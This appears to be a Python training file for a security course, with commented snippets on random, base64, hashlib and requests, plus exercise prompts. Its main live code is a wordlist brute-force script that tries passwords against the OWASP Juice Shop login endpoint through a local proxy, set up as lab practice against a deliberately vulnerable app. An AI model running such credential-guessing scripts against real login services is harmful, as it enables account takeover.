# ---------------------------------DAY 6-----------------------------------

## random
import random
### random
# print(round(random.random()*100))
### randint
# print(random.randint(10, 20))
### seed
# random.seed(50)
# print(random.randint(10, 20))
# print(random.randint(10, 20))

### choice
# print(random.choice(["salam", "necesen", "yaxsiyam"]))

### shuffle
# lst = [1,2,3,4,5,6]
# random.shuffle(lst)
# print(lst)
## TASK: secure password generator given policy

## base64
import base64
### encode/decode string
# print(base64.b64encode("strdfgfdfdfgdfi".encode()))
# print(base64.b64decode("c3RyZGZnZmRmZGZnZGZp").decode())
### urlsafe_b64encode, urlsafe_b64decode

## hashlib
import hashlib
## sha256
soz = "amiray"
hash = hashlib.sha256()
# print(hash, type(hash))
## update
# hash.update(soz.encode())
## hexdigest
# print(hash.hexdigest())
## digest
# print(hashlib.sha256(soz.encode()).digest())
# print(hashlib.sha256(soz.encode()).digest().hex())
## TASK: implement hash cracker given hash, mode and wordlist (take arguments from command line)
# print(hashlib.md5(b"password123").hexdigest())

## json
### load from string
### load from file
### write to file
### set indent

## re
## match
## search
## group
## compile
## findall
## split
## sub
## escape

# -------------------------------------------------------------------------

# requests
import requests
import urllib3
urllib3.disable_warnings()
## thm room
# http://google.com?param1=value1


## get
# response = requests.get("http://google.com", headers={
    # "User-Agent": "firefox"
# })
# print(response.headers)
# print(response.status_code)
# for header, value in response.headers.items():
#     print(f"{header}: {value}")
# print(response.text)

## verify=False
## proxies
# headers = {
#     "Cache-Control": "max-age=0",
#     "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
#     "Sec-Ch-Ua-Mobile": "?0",
#     "Sec-Ch-Ua-Platform": "Windows",
#     "Accept-Language": "en-US,en;q=0.9",
#     "Upgrade-Insecure-Requests": "1",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"
# }
# response = requests.get("https://juice-shop.herokuapp.com/", headers=headers)
# print(response.status_code)
## TASK: security header checker
## post - data, json
def login(password):
    url = "https://juice-shop.herokuapp.com/rest/user/login"
    json = {"email":"test@test.com","password":password}
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, headers=headers, json=json, verify=False, proxies={
        "http": "http://127.0.0.1:8082",
        "https": "http://127.0.0.1:8082"
    })
    if response.status_code == 200:
        print(f"Password found: {password}")
        return True
    return False

with open("words.txt", "r") as f:
    counter = 0
    for password in f:
        counter += 1
        password = password.strip()
        print(f"Trying {password}...")
        result = login(password)
        if result:
            print(f"Found at {counter+1} attempt")
            break

## session
## timeout
## uploading file
## TASK: login request
## BeautifulSoup
## TASK: implement web scraper